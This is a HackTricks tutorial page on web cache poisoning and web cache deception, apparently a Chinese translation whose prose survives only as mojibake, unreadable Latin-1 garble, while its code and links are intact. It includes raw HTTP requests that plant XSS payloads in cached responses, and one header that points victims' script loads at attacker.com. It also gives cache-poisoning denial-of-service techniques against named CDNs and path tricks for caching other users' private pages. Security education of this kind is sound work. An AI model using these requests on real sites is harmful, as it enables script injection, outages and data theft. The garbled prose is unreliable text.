# ç¼“å­˜æŠ•æ¯’ä¸ç¼“å­˜æ¬ºéª—

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## åŒºåˆ«

> **webç¼“å­˜æŠ•æ¯’ä¸webç¼“å­˜æ¬ºéª—æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ**
>
> * åœ¨**ç¼“å­˜æŠ•æ¯’**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºå°†ä¸€äº›æ¶æ„å†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åè¿™äº›å†…å®¹ä»ç¼“å­˜ä¸­æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚
> * åœ¨**ç¼“å­˜æ¬ºéª—**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºå°†å±äºå¦ä¸€ç”¨æˆ·çš„ä¸€äº›æ•æ„Ÿå†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¿™äº›å†…å®¹ã€‚

## ç¼“å­˜æŠ•æ¯’

æŠ•æ¯’ç¼“å­˜çš„ç›®æ ‡æ˜¯è®©**å®¢æˆ·ç«¯åŠ è½½éƒ¨åˆ†æˆ–å®Œå…¨ç”±æ”»å‡»è€…æ§åˆ¶çš„æ„å¤–èµ„æº**ã€‚\
è¢«æŠ•æ¯’çš„å“åº”åªä¼šæä¾›ç»™åœ¨ç¼“å­˜è¢«æŠ•æ¯’æ—¶è®¿é—®å—å½±å“é¡µé¢çš„ç”¨æˆ·ã€‚å› æ­¤ï¼Œå½±å“å¯èƒ½ä»ä¸å­˜åœ¨åˆ°å·¨å¤§ä¸ç­‰ï¼Œè¿™å–å†³äºé¡µé¢æ˜¯å¦å—æ¬¢è¿ã€‚

è¦æ‰§è¡Œç¼“å­˜æŠ•æ¯’æ”»å‡»ï¼Œæ‚¨é¦–å…ˆéœ€è¦**è¯†åˆ«æœªé”®å…¥çš„è¾“å…¥**ï¼ˆä¸éœ€è¦å‡ºç°åœ¨ç¼“å­˜è¯·æ±‚ä¸­ä½†ä¼šæ”¹å˜è¿”å›é¡µé¢çš„å‚æ•°ï¼‰ï¼Œçœ‹çœ‹**å¦‚ä½•æ»¥ç”¨**è¿™ä¸ªå‚æ•°å¹¶**è®©å“åº”è¢«ç¼“å­˜**ã€‚

### å‘ç°ï¼šæ£€æŸ¥HTTPå¤´éƒ¨

é€šå¸¸ï¼Œå½“ä¸€ä¸ªå“åº”è¢«**å­˜å‚¨åœ¨ç¼“å­˜ä¸­**æ—¶ï¼Œä¼šæœ‰ä¸€ä¸ª**å¤´éƒ¨æŒ‡ç¤ºè¿™ä¸€ç‚¹**ï¼Œæ‚¨å¯ä»¥åœ¨è¿™ç¯‡æ–‡ç« ä¸­æŸ¥çœ‹æ‚¨åº”è¯¥æ³¨æ„å“ªäº›å¤´éƒ¨ï¼š[**HTTPç¼“å­˜å¤´éƒ¨**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers)ã€‚

### å‘ç°ï¼šç¼“å­˜400ä»£ç 

å¦‚æœæ‚¨è®¤ä¸ºå“åº”è¢«å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œæ‚¨å¯ä»¥å°è¯•**å‘é€å¸¦æœ‰é”™è¯¯å¤´éƒ¨çš„è¯·æ±‚**ï¼Œè¿™åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ª**çŠ¶æ€ç ä¸º400çš„å“åº”**ã€‚ç„¶åå°è¯•æ­£å¸¸è®¿é—®è¯·æ±‚ï¼Œå¦‚æœ**å“åº”æ˜¯400çŠ¶æ€ç **ï¼Œæ‚¨å°±çŸ¥é“å®ƒæ˜¯è„†å¼±çš„ï¼ˆæ‚¨ç”šè‡³å¯ä»¥æ‰§è¡ŒDoSï¼‰ã€‚\
ä¸€ä¸ªé…ç½®ä¸å½“çš„å¤´éƒ¨å¯èƒ½åªæ˜¯`\:`ä½œä¸ºå¤´éƒ¨ã€‚\
_æ³¨æ„æœ‰æ—¶è¿™ç±»çŠ¶æ€ç ä¸ä¼šè¢«ç¼“å­˜ï¼Œæ‰€ä»¥è¿™ä¸ªæµ‹è¯•å°†æ˜¯æ— ç”¨çš„ã€‚_

### å‘ç°ï¼šè¯†åˆ«å’Œè¯„ä¼°æœªé”®å…¥çš„è¾“å…¥

æ‚¨å¯ä»¥ä½¿ç”¨ [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) æ¥**æš´åŠ›ç ´è§£å¯èƒ½**æ”¹å˜é¡µé¢å“åº”çš„**å‚æ•°å’Œå¤´éƒ¨**ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªé¡µé¢å¯èƒ½ä½¿ç”¨å¤´éƒ¨`X-Forwarded-For`æ¥æŒ‡ç¤ºå®¢æˆ·ç«¯ä»é‚£é‡ŒåŠ è½½è„šæœ¬ï¼š
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### ä»åç«¯æœåŠ¡å™¨å¼•å‘æœ‰å®³å“åº”

ç¡®å®šäº†å‚æ•°/å¤´éƒ¨åï¼Œæ£€æŸ¥å®ƒæ˜¯å¦‚ä½•è¢«**æ¸…æ´—**çš„ï¼Œä»¥åŠå®ƒåœ¨å“åº”ä¸­**åæ˜ **çš„**ä½ç½®**æˆ–å¦‚ä½•å½±å“æ¥è‡ªå¤´éƒ¨çš„å“åº”ã€‚ä½ èƒ½ä»¥ä»»ä½•æ–¹å¼æ»¥ç”¨å®ƒå—ï¼ˆæ‰§è¡ŒXSSæˆ–åŠ è½½ç”±ä½ æ§åˆ¶çš„JSä»£ç ï¼Ÿæ‰§è¡ŒDoSï¼Ÿ...ï¼‰

### è·å–ç¼“å­˜çš„å“åº”

ä¸€æ—¦ä½ **ç¡®å®š**äº†å¯ä»¥è¢«æ»¥ç”¨çš„**é¡µé¢**ï¼Œä½¿ç”¨å“ªä¸ª**å‚æ•°**/**å¤´éƒ¨**ä»¥åŠ**å¦‚ä½•**æ»¥ç”¨å®ƒï¼Œä½ éœ€è¦è®©é¡µé¢è¢«ç¼“å­˜ã€‚æ ¹æ®ä½ è¯•å›¾ç¼“å­˜çš„èµ„æºï¼Œè¿™å¯èƒ½éœ€è¦ä¸€äº›æ—¶é—´ï¼Œä½ å¯èƒ½éœ€è¦å°è¯•å‡ ç§’é’Ÿã€‚\
å“åº”ä¸­çš„å¤´éƒ¨**`X-Cache`**å¯èƒ½éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå½“è¯·æ±‚æ²¡æœ‰è¢«ç¼“å­˜æ—¶ï¼Œå®ƒå¯èƒ½æœ‰å€¼**`miss`**ï¼Œå½“å®ƒè¢«ç¼“å­˜æ—¶ï¼Œå®ƒçš„å€¼å¯èƒ½æ˜¯**`hit`**ã€‚\
å¤´éƒ¨**`Cache-Control`**ä¹Ÿå¾ˆæœ‰è¶£ï¼Œäº†è§£èµ„æºæ˜¯å¦è¢«ç¼“å­˜ï¼Œä»¥åŠä¸‹ä¸€æ¬¡èµ„æºä½•æ—¶ä¼šå†æ¬¡è¢«ç¼“å­˜ï¼š`Cache-Control: public, max-age=1800`\
å¦ä¸€ä¸ªæœ‰è¶£çš„å¤´éƒ¨æ˜¯**`Vary`**ã€‚è¿™ä¸ªå¤´éƒ¨é€šå¸¸ç”¨æ¥**æŒ‡ç¤ºé¢å¤–çš„å¤´éƒ¨**ï¼Œè¿™äº›å¤´éƒ¨è¢«è§†ä¸º**ç¼“å­˜é”®çš„ä¸€éƒ¨åˆ†**ï¼Œå³ä½¿å®ƒä»¬é€šå¸¸ä¸æ˜¯é”®æ§çš„ã€‚å› æ­¤ï¼Œå¦‚æœç”¨æˆ·çŸ¥é“ä»–æ‰€é’ˆå¯¹çš„å—å®³è€…çš„`User-Agent`ï¼Œä»–å¯ä»¥ä¸ºä½¿ç”¨é‚£ä¸ªç‰¹å®š`User-Agent`çš„ç”¨æˆ·æ±¡æŸ“ç¼“å­˜ã€‚\
ä¸ç¼“å­˜ç›¸å…³çš„å¦ä¸€ä¸ªå¤´éƒ¨æ˜¯**`Age`**ã€‚å®ƒå®šä¹‰äº†å¯¹è±¡åœ¨ä»£ç†ç¼“å­˜ä¸­çš„æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚

ç¼“å­˜è¯·æ±‚æ—¶ï¼Œè¦**å°å¿ƒä½ ä½¿ç”¨çš„å¤´éƒ¨**ï¼Œå› ä¸ºå…¶ä¸­ä¸€äº›å¯èƒ½ä¼šè¢«**æ„å¤–åœ°ç”¨ä½œ**é”®æ§ï¼Œè€Œ**å—å®³è€…å°†éœ€è¦ä½¿ç”¨ç›¸åŒçš„å¤´éƒ¨**ã€‚å§‹ç»ˆä½¿ç”¨**ä¸åŒçš„æµè§ˆå™¨**æµ‹è¯•ç¼“å­˜æŠ•æ¯’ï¼Œä»¥æ£€æŸ¥å®ƒæ˜¯å¦æœ‰æ•ˆã€‚

## åˆ©ç”¨ç¤ºä¾‹

### æœ€ç®€å•çš„ä¾‹å­

åƒ`X-Forwarded-For`è¿™æ ·çš„å¤´éƒ¨åœ¨å“åº”ä¸­æœªç»æ¸…æ´—åœ°åæ˜ å‡ºæ¥>\
ä½ å¯ä»¥å‘é€ä¸€ä¸ªåŸºæœ¬çš„XSSæœ‰æ•ˆè½½è·å¹¶æ±¡æŸ“ç¼“å­˜ï¼Œè¿™æ ·æ¯ä¸ªè®¿é—®é¡µé¢çš„äººéƒ½ä¼šå—åˆ°XSSæ”»å‡»ï¼š
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### åˆ©ç”¨ç½‘é¡µç¼“å­˜æŠ•æ¯’æ¥åˆ©ç”¨Cookieå¤„ç†æ¼æ´

Cookiesä¹Ÿå¯èƒ½åœ¨é¡µé¢çš„å“åº”ä¸­è¢«åå°„ã€‚å¦‚æœä½ èƒ½æ»¥ç”¨å®ƒæ¥å¼•èµ·XSSï¼Œä¾‹å¦‚ï¼Œä½ å¯èƒ½èƒ½å¤Ÿåœ¨å¤šä¸ªå®¢æˆ·ç«¯ä¸­åˆ©ç”¨åŠ è½½æ¶æ„ç¼“å­˜å“åº”çš„XSSã€‚
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
è¯·æ³¨æ„ï¼Œå¦‚æœæ˜“å—æ”»å‡»çš„cookieè¢«ç”¨æˆ·é¢‘ç¹ä½¿ç”¨ï¼Œå¸¸è§„è¯·æ±‚å°†ä¼šæ¸…ç†ç¼“å­˜ã€‚

### åˆ©ç”¨å¤šä¸ªå¤´éƒ¨æ¥åˆ©ç”¨Webç¼“å­˜æŠ•æ¯’æ¼æ´ <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

æœ‰æ—¶æ‚¨éœ€è¦**åˆ©ç”¨å¤šä¸ªæœªé”®å…¥çš„è¾“å…¥**æ¥æ»¥ç”¨ç¼“å­˜ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å°†`X-Forwarded-Host`è®¾ç½®ä¸ºæ‚¨æ§åˆ¶çš„åŸŸï¼Œå¹¶å°†`X-Forwarded-Scheme`è®¾ç½®ä¸º`http`ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°ä¸€ä¸ª**Open redirect**ã€‚**å¦‚æœ**æœåŠ¡å™¨**æ­£åœ¨å°†æ‰€æœ‰**HTTP**è¯·æ±‚è½¬å‘è‡³HTTPS**å¹¶ä½¿ç”¨å¤´éƒ¨`X-Forwarded-Scheme`ä½œä¸ºé‡å®šå‘çš„åŸŸåã€‚æ‚¨å¯ä»¥æ§åˆ¶é‡å®šå‘æŒ‡å‘çš„é¡µé¢ä½ç½®ã€‚
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### åˆ©ç”¨æœ‰é™çš„ `Vary` å¤´éƒ¨

å¦‚æœä½ å‘ç° **`X-Host`** å¤´éƒ¨è¢«ç”¨ä½œ**åŠ è½½ JS èµ„æºçš„åŸŸå**ï¼Œä½†å“åº”ä¸­çš„ **`Vary`** å¤´éƒ¨æŒ‡ç¤ºçš„æ˜¯ **`User-Agent`**ã€‚é‚£ä¹ˆï¼Œä½ éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥æ³„éœ²å—å®³è€…çš„ User-Agentï¼Œå¹¶ä½¿ç”¨è¯¥ User-Agent æ±¡æŸ“ç¼“å­˜ï¼š
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§æ”»å‡» HTTP ç¼“å­˜æŠ•æ¯’

åœ¨æ­¤äº†è§£å¦‚ä½•æ‰§è¡Œ[é€šè¿‡æ»¥ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œç¼“å­˜æŠ•æ¯’æ”»å‡»](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning)ã€‚

### è‡ªåŠ¨åŒ–æµ‹è¯• Web ç¼“å­˜æŠ•æ¯’

[Web ç¼“å­˜æ¼æ´æ‰«æå™¨](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) å¯ç”¨äºè‡ªåŠ¨æµ‹è¯• web ç¼“å­˜æŠ•æ¯’ã€‚å®ƒæ”¯æŒè®¸å¤šä¸åŒçš„æŠ€æœ¯ï¼Œå¹¶ä¸”é«˜åº¦å¯å®šåˆ¶ã€‚

ç¤ºä¾‹ç”¨æ³•ï¼š`wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## æ˜“å—æ”»å‡»çš„ç¤ºä¾‹

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS åœ¨è½¬å‘ URL ä¸­çš„ç‰‡æ®µæ—¶æ²¡æœ‰å°†å…¶å‰¥ç¦»ï¼Œå¹¶ä¸”ä»…ä½¿ç”¨ä¸»æœºã€è·¯å¾„å’ŒæŸ¥è¯¢ï¼ˆå¿½ç•¥ç‰‡æ®µï¼‰ç”Ÿæˆç¼“å­˜é”®ã€‚å› æ­¤ï¼Œè¯·æ±‚ `/#/../?r=javascript:alert(1)` è¢«å‘é€åˆ°åç«¯ä¸º `/#/../?r=javascript:alert(1)`ï¼Œè€Œç¼“å­˜é”®ä¸­æ²¡æœ‰åŒ…å«æœ‰æ•ˆè½½è·ï¼Œåªæœ‰ä¸»æœºã€è·¯å¾„å’ŒæŸ¥è¯¢ã€‚

### GitHub CP-DoS

å‘é€é”™è¯¯çš„ content-type å¤´éƒ¨å€¼è§¦å‘äº†ä¸€ä¸ªè¢«ç¼“å­˜çš„ 405 å“åº”ã€‚ç¼“å­˜é”®åŒ…å«äº† cookieï¼Œå› æ­¤åªèƒ½æ”»å‡»æœªè®¤è¯çš„ç”¨æˆ·ã€‚

### GitLab + GCP CP-DoS

GitLab ä½¿ç”¨ GCP å­˜å‚¨æ¡¶æ¥å­˜å‚¨é™æ€å†…å®¹ã€‚**GCP å­˜å‚¨æ¡¶**æ”¯æŒ**å¤´éƒ¨ `x-http-method-override`**ã€‚å› æ­¤ï¼Œå¯ä»¥å‘é€å¤´éƒ¨ `x-http-method-override: HEAD` å¹¶æŠ•æ¯’ç¼“å­˜ï¼Œä½¿å…¶è¿”å›ä¸€ä¸ªç©ºçš„å“åº”ä½“ã€‚å®ƒä¹Ÿå¯èƒ½æ”¯æŒ `PURGE` æ–¹æ³•ã€‚

### Rack Middleware (Ruby on rails)

Ruby on Rails åº”ç”¨ç¨‹åºé€šå¸¸ä¸ Rack ä¸­é—´ä»¶ä¸€èµ·éƒ¨ç½²ã€‚ä¸‹é¢çš„ Rack ä»£ç å–å€¼**`x-forwarded-scheme` å€¼å¹¶å°†å…¶ç”¨ä½œè¯·æ±‚çš„æ–¹æ¡ˆ**ã€‚

![](<../.gitbook/assets/image (159) (2).png>)

å‘é€ `x-forwarded-scheme: http` å¤´éƒ¨å°†å¯¼è‡´ 301 é‡å®šå‘åˆ°ç›¸åŒä½ç½®ï¼Œè¿™å°†å¯¼è‡´è¯¥èµ„æºçš„ DoSï¼Œå¦‚æ­¤ç¤ºä¾‹æ‰€ç¤ºï¼š

![](<../.gitbook/assets/image (166).png>)

åº”ç”¨ç¨‹åºå¯èƒ½è¿˜æ”¯æŒå¤´éƒ¨ `X-forwarded-host` å¹¶å°†ç”¨æˆ·é‡å®šå‘åˆ°è¯¥ä¸»æœºï¼Œä½¿å…¶å¯èƒ½ä»æ”»å‡»è€…æœåŠ¡å™¨åŠ è½½ javascript æ–‡ä»¶ï¼š

![](<../.gitbook/assets/image (157) (2).png>)

### 403 å’Œå­˜å‚¨æ¡¶

ä»¥å‰ï¼Œ**Cloudflare** æ›¾ç»**ç¼“å­˜** **403 å“åº”**ï¼Œå› æ­¤å‘é€**é”™è¯¯çš„ Authorization** å¤´éƒ¨è¯•å›¾è®¿é—®æš´éœ²çš„ **S3** æˆ– **Azure Storage Blobs** å°†è¿”å›ä¸€ä¸ªå°†è¢«ç¼“å­˜çš„ 403ã€‚Cloudflare ä¸å†ç¼“å­˜ 403 å“åº”ï¼Œä½†è¿™å¯èƒ½é€‚ç”¨äºå…¶ä»–ä»£ç†ã€‚

![](<../.gitbook/assets/image (171).png>)

### æ³¨å…¥é”®æ§å‚æ•°

é€šå¸¸ï¼Œç¼“å­˜è¢«é…ç½®ä¸º**ä»…åœ¨ç¼“å­˜é”®ä¸­åŒ…å«ç‰¹å®šçš„ GET å‚æ•°**ã€‚

ä¾‹å¦‚ï¼ŒFastly ä½¿ç”¨ Varnish **ç¼“å­˜äº†è¯·æ±‚ä¸­çš„ `size` å‚æ•°**ï¼Œä½†å¦‚æœä½ **åŒæ—¶**å‘é€äº†**`siz%65`** å‚æ•°å¹¶å¸¦æœ‰é”™è¯¯å€¼ï¼Œ**ç¼“å­˜é”®**å°†ä½¿ç”¨**æ­£ç¡®ä¹¦å†™çš„ size å‚æ•°**æ„å»ºï¼Œä½†**åç«¯**ä½¿ç”¨çš„æ˜¯**URL ç¼–ç å‚æ•°ä¸­çš„å€¼**ã€‚

![](<../.gitbook/assets/image (180).png>)

å¯¹ç¬¬äºŒä¸ª `size` å‚æ•°è¿›è¡Œ URL ç¼–ç å¯¼è‡´å®ƒè¢«ç¼“å­˜å¿½ç•¥ï¼Œä½†è¢«åç«¯ä½¿ç”¨ã€‚å°†å‚æ•°å€¼è®¾ä¸º 0 å°†å¯¼è‡´å¯ç¼“å­˜çš„ 400 Bad Requestã€‚

### ç”¨æˆ·ä»£ç†è§„åˆ™

ç”±äº FFUF æˆ– Nuclei ç­‰å·¥å…·ç”Ÿæˆçš„æµé‡é‡å¾ˆå¤§ï¼Œä¸€äº›å¼€å‘è€…å†³å®šé˜»æ­¢åŒ¹é…å…¶ç”¨æˆ·ä»£ç†çš„è¯·æ±‚ã€‚è®½åˆºçš„æ˜¯ï¼Œè¿™äº›è°ƒæ•´å¯èƒ½ä¼šå¼•å…¥ä¸å¸Œæœ›çš„ç¼“å­˜æŠ•æ¯’å’Œ DoS æœºä¼šã€‚

![](<../.gitbook/assets/image (167) (2).png>)

æˆ‘å‘ç°è¿™åœ¨å¤šä¸ªç›®æ ‡ä¸Šæœ‰æ•ˆï¼Œä½¿ç”¨æ¥è‡ªä¸åŒå·¥å…·æˆ–æ‰«æå™¨çš„ç”¨æˆ·ä»£ç†ã€‚

### éæ³•å¤´éƒ¨å­—æ®µ

å¤´éƒ¨åç§°æ ¼å¼åœ¨ [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) ä¸­å®šä¹‰å¦‚ä¸‹ï¼š

![](<../.gitbook/assets/image (175) (2).png>)

ç†è®ºä¸Šï¼Œå¦‚æœå¤´éƒ¨åç§°åŒ…å« **tchar** ä¸­æœªåˆ—å‡ºçš„å­—ç¬¦ï¼Œåˆ™åº”ä»¥ 400 Bad request æ‹’ç»ã€‚ç„¶è€Œï¼Œå®é™…ä¸Šï¼ŒæœåŠ¡å™¨å¹¶ä¸æ€»æ˜¯éµå®ˆ RFCã€‚åˆ©ç”¨è¿™ä¸€ç»†å¾®å·®åˆ«çš„æœ€ç®€å•æ–¹æ³•æ˜¯é’ˆå¯¹ Akamaiï¼Œå®ƒä¸ä¼šæ‹’ç»æ— æ•ˆçš„å¤´éƒ¨ï¼Œä½†ä¼šè½¬å‘å®ƒä»¬ï¼Œå¹¶ç¼“å­˜ä»»ä½• 400 é”™è¯¯ï¼Œåªè¦æ²¡æœ‰ cache-control å¤´éƒ¨ã€‚

![](<../.gitbook/assets/image (163).png>)

å‘é€åŒ…å«éæ³•å­—ç¬¦ `\` çš„å¤´éƒ¨å°†å¯¼è‡´ä¸€ä¸ªå¯ç¼“å­˜çš„ 400 Bad Request é”™è¯¯ã€‚è¿™æ˜¯æˆ‘æµ‹è¯•ä¸­å‘ç°çš„æœ€å¸¸è§æ¨¡å¼ä¹‹ä¸€ã€‚

### å‘ç°æ–°å¤´éƒ¨

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## ç¼“å­˜æ¬ºéª—

ç¼“å­˜æ¬ºéª—çš„ç›®æ ‡æ˜¯è®©å®¢æˆ·ç«¯**åŠ è½½å°†ç”±ç¼“å­˜ä¿å­˜å…¶æ•æ„Ÿä¿¡æ¯çš„èµ„æº**ã€‚

é¦–å…ˆæ³¨æ„ï¼Œå¦‚ `.css`ã€`.js`ã€`.png` ç­‰**æ‰©å±•å**é€šå¸¸è¢«**é…ç½®**ä¸º**ä¿å­˜**åœ¨**ç¼“å­˜ä¸­**ã€‚å› æ­¤ï¼Œå¦‚æœä½ è®¿é—® `www.example.com/profile.php/nonexistent.js`ï¼Œç¼“å­˜å¯èƒ½ä¼šå­˜å‚¨å“åº”ï¼Œå› ä¸ºå®ƒçœ‹åˆ°äº† `.js` **æ‰©å±•å**ã€‚ä½†æ˜¯ï¼Œå¦‚æœ**åº”ç”¨ç¨‹åº**æ­£åœ¨**å›æ”¾**å­˜å‚¨åœ¨ _www.example.com/profile.php_ ä¸­çš„**æ•æ„Ÿ**ç”¨æˆ·å†…å®¹ï¼Œä½ å¯ä»¥**çªƒå–**å…¶ä»–ç”¨æˆ·çš„è¿™äº›å†…å®¹ã€‚

å…¶ä»–è¦æµ‹è¯•çš„å†…å®¹ï¼š

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _ä½¿ç”¨è¾ƒä¸ä¸ºäººçŸ¥çš„æ‰©å±•åï¼Œå¦‚_ `.avif`

åœ¨è¿™ç¯‡æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªéå¸¸æ¸…æ™°çš„ä¾‹å­ï¼š[https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)ã€‚\
åœ¨ç¤ºä¾‹ä¸­ï¼Œè§£é‡Šäº†å¦‚æœä½ åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„é¡µé¢ï¼Œå¦‚ _http://www.example.com/home.php/non-existent.css_ï¼Œ_http://www.example.com/home.php_ çš„å†…å®¹ï¼ˆ**åŒ…å«ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯**ï¼‰å°†è¢«è¿”å›ï¼Œå¹¶ä¸”ç¼“å­˜æœåŠ¡å™¨å°†ä¿å­˜ç»“æœã€‚\
ç„¶åï¼Œ**æ”»å‡»è€…**å¯ä»¥åœ¨è‡ªå·±çš„æµè§ˆå™¨ä¸­è®¿é—® _http://www.example.com/home.php/non-existent.css_ å¹¶è§‚å¯Ÿä¹‹å‰è®¿é—®çš„ç”¨æˆ·çš„**æœºå¯†ä¿¡æ¯**ã€‚

è¯·æ³¨æ„ï¼Œ**ç¼“å­˜ä»£ç†**åº”è¯¥è¢«**é…ç½®**ä¸º**åŸºäº**æ–‡ä»¶çš„**æ‰©å±•å** (_.css_) è€Œä¸æ˜¯åŸºäºå†…å®¹ç±»å‹æ¥**ç¼“å­˜**æ–‡ä»¶ã€‚åœ¨ç¤ºä¾‹ _http://www.example.com/home.php/non-existent.css_ ä¸­ï¼Œå°†å…·æœ‰ `text/html` å†…å®¹ç±»å‹è€Œä¸æ˜¯ `text/css` MIME ç±»å‹ï¼ˆè¿™æ˜¯ _.css_ æ–‡ä»¶çš„é¢„æœŸï¼‰ã€‚

åœ¨æ­¤äº†è§£å¦‚ä½•æ‰§è¡Œ[åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œç¼“å­˜æ¬ºéª—æ”»å‡»](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception)ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

